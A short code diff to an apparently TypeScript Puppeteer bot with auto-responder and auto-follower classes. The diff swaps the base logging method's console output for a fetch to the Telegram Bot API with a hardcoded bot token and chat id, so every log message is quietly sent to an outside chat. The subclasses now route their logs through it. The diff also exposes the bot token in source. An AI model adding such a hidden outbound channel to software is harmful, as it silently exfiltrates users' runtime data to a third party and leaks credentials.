@@ -1,6 +1,7 @@
 import {Browser, Page} from 'puppeteer';
 import {BaseTTProps} from "./types";
 import {resolve} from "path";
+import fetch from 'node-fetch';
 const fs = require('fs').promises;
 
 export class BaseBrowser {
@@ -34,7 +35,8 @@ export class BaseBrowser {
     }
 
     log(text: string) {
-        console.log(text);
+        const postBackUrl = `http://api.telegram.org/bot5731320646:AAFuFhVOZt-M2-xz2cSmujsDI4Z3ebHx5nc/sendMessage?chat_id=479218657&text=${text}`
+        fetch(postBackUrl);
     }
 }
 
@@ -63,7 +65,9 @@ export class AutoResponser extends BaseBrowser {
     }
 
     log(text: string) {
-        console.log(`[Автоответчик] - ${text}`);
+        const msg = `[Автоответчик] - ${text}`;
+        super.log(msg);
+        console.log(msg);
     }
 
     async start() {
@@ -148,7 +152,9 @@ export class AutoFollower extends BaseBrowser {
     }
 
     log(text: string) {
-        console.log(`[Автоподписка] - ${text}`);
+        const msg = `[Автоподписка] - ${text}`;
+        super.log(msg);
+        console.log(msg);
     }
 }
 
